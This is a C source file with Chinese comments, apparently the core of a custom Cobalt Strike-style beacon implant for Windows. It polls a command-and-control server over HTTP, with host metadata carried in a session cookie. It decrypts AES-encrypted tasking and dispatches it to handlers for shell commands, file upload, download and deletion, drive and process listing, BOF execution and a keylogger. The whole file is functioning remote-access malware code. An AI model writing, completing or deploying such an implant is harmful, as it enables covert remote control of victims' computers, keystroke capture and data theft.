#include <shobjidl.h>
#include "MetaData.h"
#include "Util.h"
#include "Http.h"
#pragma warning(disable:4996)
#include "Config.h"
#include "Command.h"
#include "Job.h"
#include <tlhelp32.h>
#include <tchar.h>

// 声明变量
extern int SleepTime;
extern unsigned char AESRandaeskey[16];
extern unsigned char Hmackey[16];
extern int clientID;

VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen);

VOID beacon_main() {
    // Cookie: SESSIONID = Metadata
    wchar_t* cookie_header = makeMetaData();
    while (1) {
        // 发送心跳的同时，获取响应内容
        size_t responseSize = 0;
        unsigned char* responseEncodeData = GET(cookie_header, &responseSize);

        size_t responseDataLength = 0;

        // 在这个函数还要经过一次 NetBios 解码，一次 XOR 解密对应 Mask，因为 profile 这样写的
        unsigned char* responseData = parseGetResponse(responseEncodeData, responseSize, &responseDataLength);

        if (responseDataLength > 16 && responseDataLength % 16 == 0) {
            // 直接去掉 HMAC Hash，这里还没有未实现 Hash 校验
            size_t dataLength = responseDataLength;
            size_t middleDataLength = dataLength - 16; 

            // 开始解密指令(AES CBC)
            unsigned char* key = AESRandaeskey;

            size_t ivLength = strlen((char*)IV);
            size_t decryptAES_CBCdatalen;
            unsigned char* decryptAES_CBCdata = AesCBCDecrypt(responseData, key, middleDataLength, &decryptAES_CBCdatalen);

            if (decryptAES_CBCdata != NULL) {
				// 这里四个字节？
                unsigned char* lenBytesStart = decryptAES_CBCdata + 4;
                uint8_t lenBytes[4];
                memcpy(lenBytes, lenBytesStart, 4);

                // 这四个字节是所有指令总长度
                uint32_t bigEndianLenBytes = bigEndianUint32(lenBytes);     
                // 指令数据，当有多条指令发过来时结构如下
                // 指令数据包格式：cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(commandLen Bytes) || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...
                // commandLen 只是 commandBuf 的长度
                unsigned char* decryptedBuf = decryptAES_CBCdata + 8;       

                // 指令数据大小计数
                size_t executeCount = 0;

                while (1) {
                    // 指令解析完了
                    if (bigEndianLenBytes <= 0) {
                        break;
                    }

                    int callbackType = 0;

                    // 下面这三个参数都是数据包的三个字段
                    uint32_t commandType = 0;
                    size_t commandBuflen = 0;
                    unsigned char* commandBuf = NULL;

                    // 每解析一个指令 bigEndianLenBytes 会减少一个对应指令的长度
                    commandBuf = parsePacket(decryptedBuf, &bigEndianLenBytes, &commandType, &commandBuflen, &executeCount);

                    executeCommand(commandBuf, commandType, commandBuflen);
                }

                // 一次请求获取的全部指令的已经执行完毕 开始 free
                free(decryptAES_CBCdata);
                decryptAES_CBCdata = NULL;
            }
        }
        Sleep(SleepTime);
    }
    free(cookie_header);
}

int main() {
    beacon_main();
    return 0;
}

 VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen) {
    unsigned char* postMsg = NULL;  // 此参数用于 DataProcess
    size_t msgLength = 0;           // 此参数用于 DataProcess
    int callbackType = 0;           // 此参数用于 DataProcess 不能使用 DWORD 表示 必须有符号 

    switch (commandType)
    {
    case CMD_TYPE_SLEEP:         // 1
        CmdChangSleepTimes(commandBuf);
        break;
    case CMD_TYPE_FILE_BROWSE:   // 1
        callbackType = 22;
        postMsg = CmdFileBrowse(commandBuf, &msgLength);
        break;
    case CMD_TYPE_UPLOAD_START:  // 0
        postMsg = CmdUpload(commandBuf, &commandBuflen, &msgLength, 1);
        callbackType = -1;
        break;
    case CMD_TYPE_UPLOAD_LOOP:   // 0
        postMsg = CmdUpload(commandBuf, &commandBuflen, &msgLength, 2);
        callbackType = -1;
        break;
    case  CMD_TYPE_DRIVES:       // 1
        callbackType = 22;
        postMsg = CmdDrives(commandBuf, &msgLength);
        break;
    case  CMD_TYPE_MKDIR: // 1 
        callbackType = 0;
        postMsg = CmdMkdir(commandBuf, &commandBuflen, &msgLength);
        break;
    case CMD_TYPE_PWD:    // 1
        callbackType = 0;
        postMsg = CmdPwd(commandBuf, &msgLength);
        break;
    case CMD_TYPE_GETUID: //1
        callbackType = 0;
        postMsg = CmdGetUid(commandBuf, &msgLength);
        break;
    case CMD_TYPE_RM:     // 1
        callbackType = 0;
        postMsg = CmdFileRemove(commandBuf, &commandBuflen, &msgLength);
        break;
    case CMD_TYPE_DOWNLOAD: // 1
        callbackType = 0;
        postMsg = CmdFileDownload(commandBuf, &commandBuflen, &msgLength);
        break;
    case CMD_TYPE_SHELL:
        callbackType = 0;
        CmdShell(commandBuf, &commandBuflen);
		// commanfBuf赋值为NULL，对于此分支不应该有由主线程负责free commanfBuf
		// 因为 CmdShell 中会创建线程，线程中会使用 commanfBuf
		// 线程结束后会自动释放 commanfBuf
		// 如果提前释放 commanfBuf 会导致线程访问已释放内存
        //commandBuf = NULL;
        break;
    case CMD_TYPE_Jobs:
        callbackType = -1;
        beacon_jobs();
        break;
    case CMD_TYPE_Jobskill:
        callbackType = -1;
        beacon_JobKill(commandBuf, &msgLength);;
        break;
    case CMD_TYPE_BOF:  // 1
        callbackType = -1;
        CmdBeaconBof(commandBuf, &commandBuflen);
        break;
    case CMD_TYPE_EXIT: // 1
        exit(-1);
    case CMD_TYPE_PIPE:
        callbackType = -1;
        PipeJob(commandBuf, &commandBuflen, &msgLength);
        break;
    case CMD_TYPE_PS:  // 1
        callbackType = -1;
        CmdPs(commandBuf, &commandBuflen);
        break;
    case CMD_TYPE_SPAWN_X64:
        callbackType = -1;
        exit(-1);
        break;
    case CMD_TYPE_KEYLOGGER:
        callbackType = -1;
        KEYLOGGEJob(0, commandBuf, &commandBuflen, 1);
        break;
    default:
        callbackType = 0;
        unsigned char* result = "[-] This Command Not Accomplish";
        unsigned char* resultMemmory = (unsigned char*)malloc(strlen(result) + 1);
        if (!resultMemmory) {
            fprintf(stderr, "Memory allocation failed for resultMemmory\n");
            return;
        }
        memcpy(resultMemmory, result, strlen(result));
        postMsg = resultMemmory;
        msgLength = strlen(result);
        break;
    }

 //   if(commandBuf != NULL) {
 //       free(commandBuf);
	//}
    free(commandBuf);

    if (callbackType >= 0 && postMsg) {
        DataProcess(postMsg, msgLength, callbackType);
        free(postMsg);
    }
}
